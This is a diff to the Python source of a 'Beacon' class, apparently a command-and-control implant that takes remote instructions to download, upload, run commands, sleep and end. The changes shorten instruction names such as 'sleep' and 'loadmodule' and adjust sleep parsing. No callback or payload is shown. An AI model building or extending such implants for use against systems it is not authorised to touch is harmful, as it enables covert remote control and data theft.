@@ -39,8 +39,8 @@ INSTRUCTION_CAT = "cat"
 INSTRUCTION_DOWNLOAD = "download"
 INSTRUCTION_UPLOAD = "upload"
 INSTRUCTION_RUN = "run"
-INSTRUCTION_SLEEP = "sleep"
-INSTRUCTION_END = "end"
+INSTRUCTION_SLEEP = "SL"
+INSTRUCTION_END = "EN"
 
 # Miscellaneous command strings
 DEFAULT_LIST_DIRECTORY = "."
@@ -674,7 +674,7 @@ class Beacon:
 
     def _register_instruction_handlers(self) -> None:
         handlers = {
-            "loadmodule": self._handle_load_module,
+            "lm": self._handle_load_module,
             "change_directory": self._handle_change_directory,
             "changedirectory": self._handle_change_directory,
             "cd": self._handle_change_directory,
@@ -911,7 +911,6 @@ class Beacon:
                 data = data.encode("utf-8")
 
             result = ""
-
             handler = self._instruction_handlers.get(str(instruction).lower())
 
             if handler:
@@ -923,7 +922,7 @@ class Beacon:
                     data = b""
 
             elif instruction == INSTRUCTION_SLEEP:
-                self.sleepTimeMs=int(cmd)*SLEEP_SECONDS_TO_MILLISECONDS
+                self.sleepTimeMs=int(float(cmd)*SLEEP_SECONDS_TO_MILLISECONDS)
                 result = cmd
 
             elif instruction == INSTRUCTION_END:
@@ -953,7 +952,7 @@ class Beacon:
         self.tasks.clear()
 
     def _handle_load_module(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
-        return ("Load Module is not required for this implant.", b"")
+        return ("LoadModule is not required.", b"")
 
     def _handle_change_directory(self, cmd: str, args: str, data: bytes, input_file: str, output_file: str, pid: int) -> Tuple[str, bytes]:
         target = cmd or args or input_file or "."
